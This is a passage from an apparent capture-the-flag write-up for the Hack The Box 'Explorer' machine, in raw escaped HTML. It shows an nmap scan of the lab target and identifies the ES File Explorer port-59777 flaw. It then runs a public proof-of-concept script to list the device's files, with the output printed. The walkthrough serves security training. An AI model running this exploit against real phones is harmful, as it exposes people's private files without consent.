&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nmap -sV -p 2222,5555,37103,42135,59777 10.10.10.247 -oN explorer.all-ports 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-27 11:23 EDT
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.247
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.091s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT      STATE    SERVICE VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2222/tcp  open     ssh     &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5555/tcp  filtered freeciv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;37103/tcp closed   unknown
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;42135/tcp open     http    ES File Explorer Name Response httpd
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;59777/tcp open     http    Bukkit JSONAPI httpd &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Minecraft game server 3.6.0 or older
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SF-Port2222-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6/27%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;60D897F3%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NU
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SF:LL,24,&lt;span class=&#34;s2&#34;&gt;&amp;#34;SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: Device: phone
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 12.45 seconds
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;enumerating-port-59777&#34;&gt;Enumerating port 59777&lt;/h1&gt;
&lt;p&gt;While searching online for information about port 42135 brought no results, searching for port 59777 instantly brought results. The result of the search was &lt;a href=&#34;https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port&#34;&gt;this&lt;/a&gt; article which describes a vulnerability where Android ES File Explorer exposes user data through the open port 59777. This vulnerability, discovered by a security researcher named &lt;a href=&#34;https://twitter.com/fs0c131y/status/1085460755313508352&#34;&gt;Baptiste Robert&lt;/a&gt; allows anyone connected to the same local network to remotely get a file from the device using ES File Explorer. Moreover, a POC python script can also be found &lt;a href=&#34;https://github.com/fs0c131y/ESFileExplorerOpenPortVuln&#34;&gt;here&lt;/a&gt;. It seems this is our way of listing the device&amp;rsquo;s files.&lt;/p&gt;
&lt;h1 id=&#34;using-the-script-to-list-files&#34;&gt;Using the script to list files&lt;/h1&gt;
&lt;p&gt;Following the instructions on the script&amp;rsquo;s page, it seems that the script&amp;rsquo;s usage is the following:
&lt;code&gt;poc.py --cmd &#39;command&#39; --host target_ip&lt;/code&gt;
There are multiple commands available to the script, however the most useful appear to be &lt;strong&gt;listFiles&lt;/strong&gt; and &lt;strong&gt;listPics&lt;/strong&gt;.
The first command to try was listFiles:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python poc.py --cmd listFiles --host 10.10.10.247 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep file
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vndservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;65.00 Bytes (65 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_service_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_seapp_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_property_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;392.00 Bytes (392 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_hwservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;0.00 Bytes (0 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;vendor_file_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.92 KB (7,081 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;ueventd.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;5.00 KB (5,122 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;ueventd.android_x86_64.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;464.00 Bytes (464 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;sepolicy&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;357.18 KB (365,756 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_service_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;13.73 KB (14,057 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_seapp_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.28 KB (1,315 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_property_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6.53 KB (6,687 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_hwservice_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;7.04 KB (7,212 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;plat_file_contexts&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;23.30 KB (23,863 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.zygote64_32.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;875.00 Bytes (875 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.zygote32.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;511.00 Bytes (511 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.usb.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;5.51 KB (5,646 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;init.usb.configfs.rc&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;time&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;6/26/21 03:07:45 PM&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;size&amp;#34;&lt;/span&gt;:&lt;span class=&#34;s2&#34;&gt;&amp;#34;7.51 KB (7,690 Bytes)&amp;#34;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, 
